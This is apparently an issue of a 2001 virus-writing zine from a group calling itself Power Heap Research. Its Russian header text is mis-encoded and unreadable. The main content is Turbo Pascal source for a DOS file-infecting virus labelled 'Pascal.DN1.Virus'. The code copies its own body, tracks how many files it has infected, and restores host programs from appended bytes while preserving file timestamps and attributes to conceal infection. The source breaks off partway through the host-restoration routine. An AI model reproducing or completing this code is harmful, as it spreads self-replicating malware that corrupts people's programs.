
                        =>POWER HEAP RESEARCH<=

      ﬁ€€› ‹€€€€€‹ ‹€€€€€€ ‹€€€€€€ ‹€€€€€‹ €€€€€€€ ‹€€€€€€ €€€€€€‹
       €€  €€   €€ €€‹‹‹‹  €€‹‹‹‹  €€        ﬁ€›   €€‹‹‹‹  €€   €€
       €€  €€   €€ €€ﬂﬂﬂﬂ  €€ﬂﬂﬂﬂ  €€        ﬁ€›   €€ﬂﬂﬂﬂ  €€   €€
      ﬁ€€› €€   €€ €€      ﬂ€€€€€€ ﬂ€€€€€ﬂ   ﬁ€›   ﬂ€€€€€€ €€€€€€ﬂ

              ‹€€€€€€       €€€€€€‹ €€   €€ €€€€€€‹ ‹€€€€€‹
              €€‹‹‹‹  ‹‹‹‹‹ €€‹‹‹€ﬂ €€   €€ €€   €€ €€  ‹‹‹
              €€ﬂﬂﬂﬂ  ﬂﬂﬂﬂﬂ €€ﬂﬂﬂ€€ €€   €€ €€€€€€  €€   €€
              ﬂ€€€€€€       €€€€€€ﬂ ﬂ€€€€€ﬂ €€  ﬂ€€ ﬂ€€€€€ﬂ

                          [Üyp≠†´ ¢®p¨•©™•pÆ¢]

 HÆ¨•p 5 ß† 2001
 ---------------

                                     "íÎ §y¨†•ËÏ - Ô ‚¢Æ© Øp®§†‚Æ™ ? H•‚.
                                      ü - Ì‚Æ Ô.
                                      . . . . . . . . . . . . . . . . . .
                                      å•≠Ô ØÆ·‚pÆ®´ Á•´Æ¢•™.   à ¢Æ‚ - 
                                      ë†¨ £Æ¢ÆpÓ Ô · Ì‚®¨ Á•´Æ¢•™Æ¨."

                                      Ñ¶Æ≠ ìÌ©≠ "ë‚®Â®, Øp®Ø®·Î¢†•¨Î•
                                                  Ì´•™‚pÆ≠≠Æ¨y ¨Æß£y"


                            Ç®py·Î ≠† Ø†·™†´•


 ë•¨•©·‚¢Æ Pascal.DN1.Virus

{$M 2048 , 0 , 0}
{$A-}
{$B-}
{$D-}
{$E+}
{$F-}
{$G-}
{$I-}
{$L-}
{$N-}
{$S-}
{$V-}
{$X+}

Uses Dos;

 Const
     VirName   =  ' ˛HelloweenViRuSGen.Virus˛';
     VirLabel  : String[5] = 'CHEAT  ';
     VirLen    =  5040;
     Author    =  ' € Helloween €';
     VirString =  ' -=666=-';
     HVG       =  ' [HVG]';
     PHR       =  ' =>POWER HEAP RESEARCH<=';
     InfCount  =  9; (* ™Æ´-¢Æ ß†p†¶•≠®© *)

 Var
    VirIdentifier     :  Array [1..5] of Char;
    VirBody           :  File;
    CmdLine           :  String;
    OurName           :  PathStr;
    I                 :  Integer;
    Target            :  File;
    TargetFile        :  PathStr;
    VirBuf            :  Array [1..VirLen] of Char;
    TargetBuf         :  Array [1..VirLen] of Char;
    Attr              :  Word;
    Time              :  LongInt;
    InfFiles          :  Byte;
    DirInfo           :  SearchRec;
    LabelBuf          :  Array [1..5] of Char;
    Left              :  String;

 procedure Init;
  begin

     OurName:=ParamStr(0);

     LabelBuf[1]:=VirLabel[1];
     LabelBuf[2]:=VirLabel[2];
     LabelBuf[3]:=VirLabel[3];
     LabelBuf[4]:=VirLabel[4];
     LabelBuf[5]:=VirLabel[5];

     InfFiles:=0;

     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen);

     Close(VirBody);

     IF ParamCount <> 0 THEN
        begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I);
        End;

 end;

 procedure ExecOriginal;
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);

    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen - 5);

    BlockRead(VirBody , TargetBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen - 5);
    Truncate(VirBody);

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
